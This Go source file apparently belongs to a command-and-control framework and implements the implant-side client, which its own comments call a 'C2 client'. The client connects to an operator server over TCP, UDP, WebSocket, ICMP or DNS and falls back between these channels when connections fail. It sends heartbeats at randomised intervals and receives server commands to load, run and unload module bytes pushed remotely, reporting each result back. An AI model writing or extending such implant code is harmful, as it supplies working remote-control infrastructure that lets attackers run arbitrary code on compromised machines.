package client

import (
    "context"
    "encoding/json"
    "fmt"
    "math/rand"
    "sync"
    "time"

    "github.com/Cl0udRs4/dinot/internal/client/module"
    "github.com/Cl0udRs4/dinot/internal/client/protocol"
)

// Config represents the client configuration
type Config struct {
    // ID is the client ID
    ID string
    
    // Name is the client name
    Name string
    
    // ServerAddresses is a map of protocol names to server addresses
    ServerAddresses map[string]string
    
    // HeartbeatInterval is the interval between heartbeats
    HeartbeatInterval time.Duration
    
    // ProtocolSwitchThreshold is the number of failures before switching protocols
    ProtocolSwitchThreshold int
}

// Client represents a C2 client
type Client struct {
    config                Config
    protocolMgr           *protocol.ProtocolManager
    moduleMgr             *module.ModuleManager
    ctx                   context.Context
    cancel                context.CancelFunc
    wg                    sync.WaitGroup
    heartbeatTick         *time.Ticker
    mu                    sync.RWMutex
    randomHeartbeatEnabled bool
    minHeartbeatInterval  time.Duration
    maxHeartbeatInterval  time.Duration
    lastHeartbeatTime     time.Time
    heartbeatFailCount    int
    heartbeatTimeout      time.Duration
}

// NewClient creates a new client
func NewClient(config Config) (*Client, error) {
    // Create protocols
    protocols := make([]protocol.Protocol, 0)
    
    if addr, ok := config.ServerAddresses["tcp"]; ok {
        protocols = append(protocols, protocol.NewTCPProtocol(addr))
    }
    
    if addr, ok := config.ServerAddresses["udp"]; ok {
        protocols = append(protocols, protocol.NewUDPProtocol(addr))
    }
    
    if addr, ok := config.ServerAddresses["ws"]; ok {
        protocols = append(protocols, protocol.NewWSProtocol(addr))
    }
    
    if addr, ok := config.ServerAddresses["icmp"]; ok {
        protocols = append(protocols, protocol.NewICMPProtocol(addr))
    }
    
    if domain, ok := config.ServerAddresses["dns_domain"]; ok {
        if server, ok := config.ServerAddresses["dns_server"]; ok {
            protocols = append(protocols, protocol.NewDNSProtocol(domain, server))
        }
    }
    
    if len(protocols) == 0 {
        return nil, protocol.ErrNoProtocolAvailable
    }
    
    ctx, cancel := context.WithCancel(context.Background())
    
    return &Client{
        config:                config,
        protocolMgr:           protocol.NewProtocolManager(protocols, config.ProtocolSwitchThreshold),
        moduleMgr:             module.NewModuleManager(),
        ctx:                   ctx,
        cancel:                cancel,
        heartbeatTick:         time.NewTicker(config.HeartbeatInterval),
        randomHeartbeatEnabled: false,
        minHeartbeatInterval:  1 * time.Second,
        maxHeartbeatInterval:  24 * time.Hour,
        heartbeatTimeout:      30 * time.Second,
        heartbeatFailCount:    0,
        lastHeartbeatTime:     time.Now(),
    }, nil
}

// Start starts the client
func (c *Client) Start() error {
    err := c.protocolMgr.Connect(c.ctx)
    if err != nil {
        return err
    }
    
    // Start heartbeat goroutine
    c.wg.Add(1)
    go c.heartbeatLoop()
    
    // Start command handler goroutine
    c.wg.Add(1)
    go c.commandLoop()
    
    return nil
}

// Stop stops the client
func (c *Client) Stop() error {
    c.cancel()
    c.heartbeatTick.Stop()
    c.wg.Wait()
    return c.protocolMgr.Disconnect()
}

// heartbeatLoop sends periodic heartbeats to the server
func (c *Client) heartbeatLoop() {
    defer c.wg.Done()
    
    for {
        select {
        case <-c.ctx.Done():
            return
        case <-c.heartbeatTick.C:
            c.mu.Lock()
            c.lastHeartbeatTime = time.Now()
            c.mu.Unlock()
            
            err := c.sendHeartbeat()
            if err != nil {
                c.mu.Lock()
                c.heartbeatFailCount++
                
                // If we've failed too many times, try switching protocols
                if c.heartbeatFailCount >= c.config.ProtocolSwitchThreshold {
                    // The protocol manager will handle the actual switching
                    c.heartbeatFailCount = 0
                }
                
                c.mu.Unlock()
            } else {
                c.mu.Lock()
                c.heartbeatFailCount = 0
                
                // If random heartbeats are enabled, update the interval
                if c.randomHeartbeatEnabled {
                    c.updateHeartbeatInterval()
                }
                
                c.mu.Unlock()
            }
        }
    }
}

// sendHeartbeat sends a heartbeat to the server
func (c *Client) sendHeartbeat() error {
    c.mu.RLock()
    randomEnabled := c.randomHeartbeatEnabled
    interval := c.config.HeartbeatInterval
    if c.heartbeatTick != nil {
        // Reset the ticker with the current interval
        c.heartbeatTick.Reset(interval)
    }
    c.mu.RUnlock()
    
    heartbeat := map[string]interface{}{
        "type":           "heartbeat",
        "client_id":      c.config.ID,
        "timestamp":      time.Now().Unix(),
        "random_enabled": randomEnabled,
        "interval":       interval.Milliseconds(),
        "protocol":       c.protocolMgr.GetCurrentProtocol().GetName(),
    }
    
    data, err := json.Marshal(heartbeat)
    if err != nil {
        // Log error
        return err
    }
    
    return c.protocolMgr.Send(data)
}

// commandLoop receives and processes commands from the server
func (c *Client) commandLoop() {
    defer c.wg.Done()
    
    for {
        select {
        case <-c.ctx.Done():
            return
        default:
            c.processNextCommand()
        }
    }
}

// processNextCommand processes the next command from the server
func (c *Client) processNextCommand() {
    data, err := c.protocolMgr.Receive(5 * time.Second)
    if err != nil {
        // Handle timeout or other errors
        time.Sleep(1 * time.Second)
        return
    }
    
    var command struct {
        Type   string          `json:"type"`
        Module string          `json:"module,omitempty"`
        Params json.RawMessage `json:"params,omitempty"`
    }
    
    err = json.Unmarshal(data, &command)
    if err != nil {
        // Log error
        return
    }
    
    switch command.Type {
    case "execute_module":
        c.handleExecuteModule(command.Module, command.Params)
    case "load_module":
        c.handleLoadModule(command.Module, command.Params)
    case "unload_module":
        c.handleUnloadModule(command.Module)
    }
}

// handleExecuteModule handles the execute_module command
func (c *Client) handleExecuteModule(moduleName string, params json.RawMessage) {
    result, err := c.moduleMgr.ExecuteModule(c.ctx, moduleName, params)
    
    response := map[string]interface{}{
        "type":      "module_result",
        "client_id": c.config.ID,
        "module":    moduleName,
        "success":   err == nil,
    }
    
    if err != nil {
        response["error"] = err.Error()
    } else {
        response["result"] = result
    }
    
    data, err := json.Marshal(response)
    if err != nil {
        // Log error
        return
    }
    
    err = c.protocolMgr.Send(data)
    if err != nil {
        // Log error
    }
}

// handleLoadModule handles the load_module command
func (c *Client) handleLoadModule(moduleName string, params json.RawMessage) {
    var moduleData struct {
        ModuleBytes []byte `json:"module_bytes"`
    }
    
    err := json.Unmarshal(params, &moduleData)
    
    response := map[string]interface{}{
        "type":      "module_load_result",
        "client_id": c.config.ID,
        "module":    moduleName,
        "success":   false,
    }
    
    if err != nil {
        response["error"] = fmt.Sprintf("Failed to parse module data: %v", err)
    } else {
        // Load the module
        err = c.moduleMgr.LoadModuleFromBytes(moduleName, moduleData.ModuleBytes)
        if err != nil {
            response["error"] = fmt.Sprintf("Failed to load module: %v", err)
        } else {
            response["success"] = true
        }
    }
    
    data, err := json.Marshal(response)
    if err != nil {
        // Log error
        return
    }
    
    err = c.protocolMgr.Send(data)
    if err != nil {
        // Log error
    }
}

// handleUnloadModule handles the unload_module command
func (c *Client) handleUnloadModule(moduleName string) {
    err := c.moduleMgr.UnloadModule(moduleName)
    
    response := map[string]interface{}{
        "type":      "module_unload_result",
        "client_id": c.config.ID,
        "module":    moduleName,
        "success":   err == nil,
    }
    
    if err != nil {
        response["error"] = err.Error()
    }
    
    data, err := json.Marshal(response)
    if err != nil {
        // Log error
        return
    }
    
    err = c.protocolMgr.Send(data)
    if err != nil {
        // Log error
    }
}

// EnableRandomHeartbeat enables random heartbeat intervals
func (c *Client) EnableRandomHeartbeat(min, max time.Duration) {
    c.mu.Lock()
    defer c.mu.Unlock()
    
    c.randomHeartbeatEnabled = true
    c.minHeartbeatInterval = min
    c.maxHeartbeatInterval = max
    
    // Generate a new random interval immediately
    c.updateHeartbeatInterval()
}

// DisableRandomHeartbeat disables random heartbeat intervals
func (c *Client) DisableRandomHeartbeat() {
    c.mu.Lock()
    defer c.mu.Unlock()
    
    c.randomHeartbeatEnabled = false
    
    // Reset to the configured interval
    if c.heartbeatTick != nil {
        c.heartbeatTick.Stop()
    }
    c.heartbeatTick = time.NewTicker(c.config.HeartbeatInterval)
}

// updateHeartbeatInterval generates a new random heartbeat interval
func (c *Client) updateHeartbeatInterval() {
    if !c.randomHeartbeatEnabled {
        return
    }
    
    // Generate a random duration between min and max
    randomDuration := c.minHeartbeatInterval +
        time.Duration(rand.Int63n(int64(c.maxHeartbeatInterval-c.minHeartbeatInterval)))
    
    // Update the ticker
    if c.heartbeatTick != nil {
        c.heartbeatTick.Stop()
    }
    c.heartbeatTick = time.NewTicker(randomDuration)
}

// GetSupportedModules returns a list of supported modules
func (c *Client) GetSupportedModules() []string {
    return c.moduleMgr.GetModules()
}
